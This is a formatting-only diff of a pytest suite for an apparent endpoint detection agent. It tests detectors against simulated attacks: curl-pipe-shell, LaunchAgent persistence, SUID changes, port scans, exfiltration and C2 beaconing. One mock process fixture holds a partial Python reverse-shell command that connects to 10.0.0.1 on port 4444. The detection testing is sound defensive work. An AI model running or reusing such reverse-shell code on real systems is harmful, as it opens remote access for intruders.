@@ -35,7 +35,6 @@ import pytest
 
 from amoskys.agents.common.probes import ProbeContext, Severity
 
-
 # ============================================================================
 # HELPERS
 # ============================================================================
@@ -78,8 +77,10 @@ class TestScenario01_BinaryFromTemp:
             "create_time": 1700000000.0,
         }
 
-        with patch("amoskys.agents.proc.probes.psutil") as mp, \
-             patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True):
+        with (
+            patch("amoskys.agents.proc.probes.psutil") as mp,
+            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
+        ):
             mp.process_iter.return_value = [mock_proc]
             mp.NoSuchProcess = real_psutil.NoSuchProcess
             mp.AccessDenied = real_psutil.AccessDenied
@@ -119,8 +120,10 @@ class TestScenario02_CurlPipeShell:
             "create_time": 1700000000.0,
         }
 
-        with patch("amoskys.agents.proc.probes.psutil") as mp, \
-             patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True):
+        with (
+            patch("amoskys.agents.proc.probes.psutil") as mp,
+            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
+        ):
             mp.process_iter.return_value = [mock_proc]
             mp.NoSuchProcess = real_psutil.NoSuchProcess
             mp.AccessDenied = real_psutil.AccessDenied
@@ -154,15 +157,18 @@ class TestScenario03_PythonReverseShell:
             "pid": 9001,
             "name": "python3",
             "cmdline": [
-                "python3", "-c",
+                "python3",
+                "-c",
                 "import socket,subprocess,os; s=socket.socket(); s.connect(('10.0.0.1',4444))",
             ],
             "username": "attacker",
             "create_time": 1700000000.0,
         }
 
-        with patch("amoskys.agents.proc.probes.psutil") as mp, \
-             patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True):
+        with (
+            patch("amoskys.agents.proc.probes.psutil") as mp,
+            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
+        ):
             mp.process_iter.return_value = [mock_proc]
             mp.NoSuchProcess = real_psutil.NoSuchProcess
             mp.AccessDenied = real_psutil.AccessDenied
@@ -226,7 +232,9 @@ class TestScenario04_LaunchAgentPersistence:
 
         assert len(events) >= 1
         ev = events[0]
-        assert "launchd" in ev.event_type.lower() or "persistence" in ev.event_type.lower()
+        assert (
+            "launchd" in ev.event_type.lower() or "persistence" in ev.event_type.lower()
+        )
         assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
         assert any("T1543" in t for t in ev.mitre_techniques)
 
@@ -648,9 +656,11 @@ class TestScenario13_SUIDbitChange:
             sha256="a" * 64,
             size=4096,
             mode=stat.S_IFREG | 0o755,  # No SUID
-            uid=0, gid=0,
+            uid=0,
+            gid=0,
             mtime_ns=_now_ns() - 1_000_000_000,
-            is_dir=False, is_symlink=False,
+            is_dir=False,
+            is_symlink=False,
         )
 
         new_state = FileState(
@@ -658,9 +668,11 @@ class TestScenario13_SUIDbitChange:
             sha256="a" * 64,
             size=4096,
             mode=stat.S_IFREG | 0o4755,  # SUID set!
-            uid=0, gid=0,
+            uid=0,
+            gid=0,
             mtime_ns=_now_ns(),
-            is_dir=False, is_symlink=False,
+            is_dir=False,
+            is_symlink=False,
         )
 
         change = FileChange(
@@ -708,9 +720,11 @@ class TestScenario14_ConfigBackdoor:
             sha256="b" * 64,
             size=50,
             mode=stat.S_IFREG | 0o644,
-            uid=0, gid=0,
+            uid=0,
+            gid=0,
             mtime_ns=_now_ns(),
-            is_dir=False, is_symlink=False,
+            is_dir=False,
+            is_symlink=False,
         )
 
         # Use the temp file path so _check_ssh_config can read it
@@ -855,9 +869,13 @@ class TestScenario17_PortScan:
 
         flows = [
             FlowEvent(
-                src_ip="10.0.0.100", dst_ip="10.0.0.200",
-                src_port=50000 + i, dst_port=i,
-                protocol="TCP", bytes_tx=64, bytes_rx=0,
+                src_ip="10.0.0.100",
+                dst_ip="10.0.0.200",
+                src_port=50000 + i,
+                dst_port=i,
+                protocol="TCP",
+                bytes_tx=64,
+                bytes_rx=0,
                 packet_count=1,
                 first_seen_ns=now + i * 1_000_000,
                 last_seen_ns=now + i * 1_000_000,
@@ -891,15 +909,19 @@ class TestScenario18_DataExfil:
 
         flows = [
             FlowEvent(
-                src_ip="10.0.0.5", dst_ip="203.0.113.99",
-                src_port=54321, dst_port=443,
+                src_ip="10.0.0.5",
+                dst_ip="203.0.113.99",
+                src_port=54321,
+                dst_port=443,
                 protocol="TCP",
                 bytes_tx=55 * 1024 * 1024,  # 55 MB (nettop populated)
                 bytes_rx=1024,
                 packet_count=1000,
-                first_seen_ns=now, last_seen_ns=now,
+                first_seen_ns=now,
+                last_seen_ns=now,
                 direction="OUTBOUND",
-                pid=5555, process_name="exfil_tool",
+                pid=5555,
+                process_name="exfil_tool",
             )
         ]
 
@@ -930,15 +952,19 @@ class TestScenario19_C2Beacon:
         # 6 flows at exactly 60s intervals, small bytes
         flows = [
             FlowEvent(
-                src_ip="10.0.0.5", dst_ip="198.51.100.1",
-                src_port=54321, dst_port=443,
+                src_ip="10.0.0.5",
+                dst_ip="198.51.100.1",
+                src_port=54321,
+                dst_port=443,
                 protocol="TCP",
-                bytes_tx=256, bytes_rx=128,
+                bytes_tx=256,
+                bytes_rx=128,
                 packet_count=1,
                 first_seen_ns=now + i * 60_000_000_000,
                 last_seen_ns=now + i * 60_000_000_000,
                 direction="OUTBOUND",
-                pid=9999, process_name="beacon",
+                pid=9999,
+                process_name="beacon",
             )
             for i in range(6)
         ]
@@ -969,15 +995,19 @@ class TestScenario20_SuspiciousTunnel:
 
         flows = [
             FlowEvent(
-                src_ip="10.0.0.5", dst_ip="198.51.100.50",
-                src_port=54321, dst_port=4444,  # Non-standard
+                src_ip="10.0.0.5",
+                dst_ip="198.51.100.50",
+                src_port=54321,
+                dst_port=4444,  # Non-standard
                 protocol="TCP",
-                bytes_tx=25000, bytes_rx=25000,
+                bytes_tx=25000,
+                bytes_rx=25000,
                 packet_count=200,  # avg size = 250 bytes (<500 threshold)
                 first_seen_ns=now - 700_000_000_000,  # 700s (>600s threshold)
                 last_seen_ns=now,
                 direction="OUTBOUND",
-                pid=7777, process_name="tunnel",
+                pid=7777,
+                process_name="tunnel",
             )
         ]
 
